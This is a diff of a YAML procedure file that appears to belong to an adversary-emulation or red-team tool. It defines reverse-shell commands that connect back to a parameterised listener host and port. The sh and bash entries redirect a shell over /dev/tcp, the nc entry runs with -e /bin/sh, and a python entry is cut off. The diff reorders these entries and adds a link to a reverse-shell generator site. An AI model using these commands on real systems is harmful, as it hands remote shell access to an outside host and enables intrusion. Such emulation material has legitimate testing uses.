@@ -16,10 +16,10 @@ parameters:
     type: int
     description: the listing port number
 procedures:
-  - key: sh
-    command: sh -i >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1 &
   - key: bash
     command: bash >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1 &
+  - key: sh
+    command: sh -i >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1
   - key: nc
     command: nc ${LISTENER} ${LISTENER_PORT} -e /bin/sh &
   - key: python
@@ -28,4 +28,5 @@ procedures:
   #   - Listener
 # cmd: {}
 # defend: {
-# refernces:
+refernces:
+  - https://www.revshells.com/
